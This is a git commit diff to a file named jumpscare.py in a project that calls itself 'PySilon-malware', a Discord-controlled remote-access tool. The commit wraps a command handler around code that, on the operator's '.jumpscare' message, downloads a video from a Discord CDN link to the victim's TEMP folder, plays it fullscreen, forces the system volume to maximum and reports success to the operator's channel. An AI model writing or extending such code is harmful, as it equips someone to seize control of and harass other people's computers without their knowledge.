46c19ba699ae0905e342a65438949da69643b704
iCronic <92695257+iCronic@users.noreply.github.com>
2023-09-23 18:18:13 +0200

    Update jumpscare.py

--- resources/source_code/jumpscare.py
+++ resources/source_code/jumpscare.py
@@ -5,22 +5,26 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 # end of imports
 
 # on message
-devices = AudioUtilities.GetSpeakers()
-interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-volume = cast(interface, POINTER(IAudioEndpointVolume))
+elif message.content == '.jumpscare':
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = cast(interface, POINTER(IAudioEndpointVolume))
 
-video_url = "https://cdn.discordapp.com/attachments/1155158384929148941/1155158417611182260/jumpscare.mp4"
+    video_url = "https://cdn.discordapp.com/attachments/1155158384929148941/1155158417611182260/jumpscare.mp4"
 
-temp_folder = os.environ['TEMP']
-temp_file = os.path.join(temp_folder, 'jumpscare.mp4')
+    temp_folder = os.environ['TEMP']
+    temp_file = os.path.join(temp_folder, 'jumpscare.mp4')
 
-if not os.path.exists(temp_file):
-    response = requests.get(video_url)
-    with open(temp_file, 'wb') as file:
-        file.write(response.content)
+    if not os.path.exists(temp_file):
+        response = requests.get(video_url)
+        with open(temp_file, 'wb') as file:
+            file.write(response.content)
 
-time.sleep(1)
-os.startfile(temp_file)
-time.sleep(0.5)
-pyautogui.press('f11')
-volume.SetMasterVolumeLevelScalar(1.0, None)
+    time.sleep(1)
+    os.startfile(temp_file)
+    time.sleep(0.5)
+    pyautogui.press('f11')
+    volume.SetMasterVolumeLevelScalar(1.0, None)
+    embed = discord.Embed(title="🟢 Jumpscare triggered",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
+    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+    await message.channel.send(embed=embed)
